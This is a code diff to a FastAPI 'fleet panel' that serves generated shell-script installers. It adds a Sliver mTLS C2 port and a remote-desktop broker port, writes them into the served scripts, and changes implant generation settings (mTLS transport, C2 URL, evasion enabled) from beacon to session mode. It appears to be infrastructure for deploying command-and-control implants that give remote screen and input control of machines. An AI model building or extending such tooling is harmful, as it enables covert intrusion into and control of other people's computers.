@@ -41,6 +41,9 @@ log = logging.getLogger("fleet.panel")
 
 CSRF_COOKIE = "fleet_csrf"
 
+C2_PORT = 8888   # Sliver mTLS C2 port
+RD_PORT = 8443   # RD broker port for screen/input
+
 REPO_ROOT = Path(__file__).resolve().parent.parent
 
 
@@ -375,7 +378,12 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             encoding="utf-8"
         )
         endpoint = str(request.base_url).rstrip("/")
-        source = template.replace("{{PANEL_ENDPOINT}}", endpoint)
+        source = (
+            template.replace("{{PANEL_ENDPOINT}}", endpoint)
+            .replace("{{PANEL_HOST}}", config.public_host or "127.0.0.1")
+            .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
+            .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
+        )
         return PlainTextResponse(
             source,
             media_type="text/x-shellscript",
@@ -424,7 +432,12 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             encoding="utf-8"
         )
         endpoint = str(request.base_url).rstrip("/")
-        source = template.replace("{{PANEL_ENDPOINT}}", endpoint)
+        source = (
+            template.replace("{{PANEL_ENDPOINT}}", endpoint)
+            .replace("{{PANEL_HOST}}", config.public_host or "127.0.0.1")
+            .replace("{{PANEL_C2_PORT}}", str(C2_PORT))
+            .replace("{{PANEL_RD_PORT}}", str(RD_PORT))
+        )
         return PlainTextResponse(
             source,
             media_type="text/x-shellscript",
@@ -864,7 +877,7 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             "format": "service",
             "transport": "mtls",
             "c2_url": c2,
-            "is_beacon": True,
+            "is_beacon": False,
             "interval": 60,
             "jitter": 35,
             "evasion": True,
